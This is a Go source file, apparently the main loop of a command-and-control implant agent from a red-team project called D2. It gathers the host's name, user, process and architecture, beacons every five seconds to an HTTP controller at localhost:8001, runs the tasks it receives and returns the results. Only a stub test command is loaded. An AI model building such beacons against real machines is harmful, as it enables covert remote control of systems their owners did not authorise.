package main

import (
	"fmt"
	"os"
	"os/user"
	"runtime"
	"time"

	"github.com/gerbsec/D2/agent/commands"
	"github.com/gerbsec/D2/agent/models"

	"github.com/google/uuid"
)

var (
	metadata   *models.AgentMetadata
	commModule models.CommModule
	cmds       = []models.AgentCommand{}
)

func main() {
	generateMetadata()
	loadAgentCommands()
	commModule = models.NewHttpCommModule("localhost", 8001)
	commModule.Init(metadata)

	done := commModule.Start()
	defer commModule.Stop()

	for {
		select {
		case <-done:
			return
		case <-time.After(time.Second * 5):
			tasks, ok := commModule.RecvData()
			if ok {
				handleTasks(tasks)
			}
		}

	}
}

func handleTasks(tasks []*models.AgentTask) {
	for _, task := range tasks {
		handleTask(task)
	}
}

func handleTask(task *models.AgentTask) {
	var cmd models.AgentCommand
	for _, c := range cmds {
		if c.Name() == task.Command {
			cmd = c
			break
		}
	}

	if cmd == nil {
		return
	}

	result := cmd.Execute(task)
	sendTaskResult(task.Id, result)
}

func sendTaskResult(taskId string, result string) {
	taskResult := &models.AgentTaskResult{
		Id:     taskId,
		Result: result,
	}

	commModule.SendData(taskResult)
}

func generateMetadata() {
	currentUser, err := user.Current()
	if err != nil {
		fmt.Println("Error getting current user:", err)
		os.Exit(1)
	}

	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting hostname:", err)
		os.Exit(1)
	}

	integrity := "High"

	architecture := "x86"
	if runtime.GOARCH == "amd64" {
		architecture = "x64"
	}

	metadata = &models.AgentMetadata{
		Id:           uuid.New().String(),
		Hostname:     hostname,
		Username:     currentUser.Username,
		ProcessName:  os.Args[0],
		ProcessId:    os.Getpid(),
		Integrity:    integrity,
		Architecture: architecture,
	}
}

func loadAgentCommands() {
	cmds = append(cmds, &commands.TestCommand{})
}
